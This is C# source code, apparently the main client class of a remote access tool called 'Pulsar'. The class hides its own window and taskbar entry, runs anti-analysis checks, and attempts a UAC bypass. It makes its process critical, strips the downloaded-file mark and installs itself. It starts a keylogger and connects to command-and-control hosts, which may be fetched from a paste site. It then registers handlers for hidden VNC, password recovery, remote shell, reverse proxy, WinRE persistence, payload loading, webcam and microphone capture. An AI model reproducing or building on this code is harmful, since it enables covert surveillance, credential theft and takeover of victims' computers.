using Pulsar.Client.Anti;
using Pulsar.Client.Config;
using Pulsar.Client.Helper.UAC;
using Pulsar.Client.Logging;
using Pulsar.Client.LoggingAPI;
using Pulsar.Client.Messages;
using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.User;
using Pulsar.Client.Utilities;
using Pulsar.Common.DNS;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.UAC;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class PulsarApplication : Form
    {
        /// <summary>
        /// Static reference to the current application instance.
        /// </summary>
        public static PulsarApplication Instance { get; private set; }

        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private PulsarClient _connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;

        /// <summary>
        /// The background keylogger service used to capture and store keystrokes.
        /// </summary>
        private KeyloggerService _keyloggerService;

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection _userActivityDetection;

        private ActiveWindowChecker _activeWindowChecker;
        private ClipboardChecker _clipboardChecker;
        private DebugLog _debugLog;

        private bool _deferredProcessorsRegistered;

        private static readonly string[] SharpDxAssemblies =
        {
            "SharpDX",
            "SharpDX.Direct3D11",
            "SharpDX.Direct2D1",
            "SharpDX.DXGI",
            "SharpDX.D3DCompiler",
            "SharpDX.Mathematics"
        };

        private static readonly string[] WebcamAssemblies =
        {
            "AForge",
            "AForge.Video",
            "AForge.Video.DirectShow"
        };

        private static readonly string[] AudioAssemblies =
        {
            "NAudio.Core",
            "NAudio.Wasapi",
            "NAudio.WinForms",
            "NAudio.WinMM"
        };

        /// <summary>
        /// Gets the clipboard checker instance.
        /// </summary>
        public ClipboardChecker ClipboardChecker => _clipboardChecker;

        /// <summary>
        /// Determines whether an installation is required depending on the current and target paths.
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="PulsarApplication"/> class.
        /// </summary>
        public PulsarApplication()
        {
            Instance = this;
            _messageProcessors = new List<IMessageProcessor>();
            _notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            // decrypt and verify the settings
            if (!Settings.Initialize())
                Environment.Exit(1);

            DeferredAssemblyManager.Initialize();

            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            // check if process with same mutex is already running on system
            if (!ApplicationMutex.CreatedNew)
                Environment.Exit(2);

            Manager.StartAnti();

            if (Settings.UACBYPASS && !UAC.IsAdministrator())
            {
                Debug.WriteLine("Attempting UAC bypass...");
                Bypass.DoUacBypass();
                Environment.Exit(5);
            }

            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
            {
                Debug.WriteLine("Setting process as critical...");
                NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
            }

            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            var installer = new ClientInstaller();

            if (IsInstallationRequired)
            {
                // close mutex before installing the client
                ApplicationMutex.Dispose();

                try
                {
                    installer.Install();
                    Environment.Exit(3);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }
            else
            {
                try
                {
                    // (re)apply settings and proceed with connect loop
                    installer.ApplySettings();
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }

                if (Settings.ENABLELOGGER)
                {
                    DeferredAssemblyManager.RunWhenAvailable(
                        new[] { "Gma.System.MouseKeyHook" },
                        () =>
                        {
                            try
                            {
                                if (_keyloggerService != null)
                                {
                                    return;
                                }

                                if (!DeferredAssemblyManager.TryEnsureAssembliesLoaded("Gma.System.MouseKeyHook"))
                                {
                                    Debug.WriteLine("Keylogger dependencies not yet available; deferring start.");
                                    return;
                                }

                                _keyloggerService = new KeyloggerService();
                                _keyloggerService.Start();
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Failed to start keylogger: {ex.Message}");
                            }
                        });
                }

                PulsarClient client;
                string hosts = Settings.HOSTS;

                if (Settings.PASTEBIN && 
                    (hosts.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || 
                     hosts.StartsWith("https://", StringComparison.OrdinalIgnoreCase)))
                {
                    Debug.WriteLine("Using pastebin mode with URL: " + hosts);
                    var hostsManager = new HostsManager(hosts);
                    client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
                }
                else
                {
                    Debug.WriteLine("Using standard host list mode");
                    var hostsList = new HostsConverter().RawHostsToList(hosts);
                    var hostsManager = new HostsManager(hostsList);
                    client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
                }

                _connectClient = client;
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();

                _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                _clipboardChecker = new ClipboardChecker(_connectClient);
                UniversalDebugLogger.Initialize(_connectClient);
                _debugLog = new DebugLog();

                new Thread(() =>
                {
                    // Start connection loop on new thread and dispose application once client exits.
                    // This is required to keep the UI thread responsive and run the message loop.
                    _connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();
            }
        }

        [System.Runtime.CompilerServices.MethodImpl(
    System.Runtime.CompilerServices.MethodImplOptions.NoInlining |
    System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            if (connected)
            {
                _notifyIcon.Text = "Pulsar Client\nConnection established";
                
                string currentWindowTitle = GetCurrentWindowTitle();
                _connectClient.Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle });
            }
            else
                _notifyIcon.Text = "Pulsar Client\nNo connection";
        }

        /// <summary>
        /// Gets the title of the currently active window.
        /// </summary>
        /// <returns>The title of the active window.</returns>
        private string GetCurrentWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = NativeMethods.GetForegroundWindow();

            if (NativeMethods.GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }

        /// <summary>
        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(PulsarClient client)
        {
            RegisterProcessor(new DeferredAssemblyHandler());

            RegisterProcessor(new PreviewHandler());
            RegisterProcessor(new PingHandler());
            RegisterProcessor(new QuickCommandHandler());
            RegisterProcessor(new HVNCHandler());
            RegisterProcessor(new ClientServicesHandler(this, client));
            RegisterProcessor(new FileManagerHandler(client));
            RegisterProcessor(new KeyloggerHandler());
            RegisterProcessor(new MessageBoxHandler());
            RegisterProcessor(new ClipboardHandler());
            RegisterProcessor(new FunStuffHandler());
            RegisterProcessor(new PasswordRecoveryHandler());
            RegisterProcessor(new RegistryHandler());
            RegisterProcessor(new RemoteShellHandler(client));
            RegisterProcessor(new ReverseProxyHandler(client));
            RegisterProcessor(new ShutdownHandler());
            RegisterProcessor(new StartupManagerHandler());
            RegisterProcessor(new SystemInformationHandler());
            RegisterProcessor(new TaskManagerHandler(client));
            RegisterProcessor(new TcpConnectionsHandler());
            RegisterProcessor(new WebsiteVisitorHandler());
            RegisterProcessor(new RemoteScriptingHandler());
            RegisterProcessor(new RemoteChatHandler());
            RegisterProcessor(new WinREPersistenceHandler());
            RegisterProcessor(new PayloadLoaderHandler());
            ScheduleDeferredMessageProcessors(client);
        }

        private void RegisterProcessor(IMessageProcessor processor)
        {
            if (processor == null)
            {
                return;
            }

            bool shouldRegister;
            lock (_messageProcessors)
            {
                shouldRegister = !_messageProcessors.Contains(processor);
                if (shouldRegister)
                {
                    _messageProcessors.Add(processor);
                }
            }

            if (shouldRegister)
            {
                MessageHandler.Register(processor);
            }
        }

        private void ScheduleDeferredMessageProcessors(PulsarClient client)
        {
            DeferredAssemblyManager.RunWhenAvailable(
                DeferredAssemblyManager.SecondaryAssemblies,
                () =>
                {
                    Action registerAction = () => RegisterDeferredMessageProcessors(client);

                    try
                    {
                        if (InvokeRequired)
                        {
                            BeginInvoke((Action)registerAction);
                        }
                        else
                        {
                            registerAction();
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to schedule deferred message processors: {ex.Message}");
                    }
                });
        }

        private void RegisterDeferredMessageProcessors(PulsarClient client)
        {
            if (_deferredProcessorsRegistered)
            {
                return;
            }

            _deferredProcessorsRegistered = true;

            try
            {
                DeferredAssemblyManager.TryEnsureAssembliesLoaded(SharpDxAssemblies);
                DeferredAssemblyManager.TryEnsureAssembliesLoaded(WebcamAssemblies);
                DeferredAssemblyManager.TryEnsureAssembliesLoaded(AudioAssemblies);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Deferred assembly load error: {ex.Message}");
            }

            RegisterProcessor(new RemoteDesktopHandler());
            RegisterProcessor(new RemoteWebcamHandler());
            RegisterProcessor(new AudioHandler());
            RegisterProcessor(new AudioOutputHandler());
        }

        /// <summary>
        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            List<IMessageProcessor> processorsCopy;

            lock (_messageProcessors)
            {
                processorsCopy = new List<IMessageProcessor>(_messageProcessors);
                _messageProcessors.Clear();
            }

            foreach (var msgProc in processorsCopy)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is IDisposable disposableMsgProc)
                {
                    disposableMsgProc.Dispose();
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _keyloggerService?.Dispose();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
                _debugLog?.Dispose(); // Dispose DebugLog
            }
            base.Dispose(disposing);
        }
    }
}
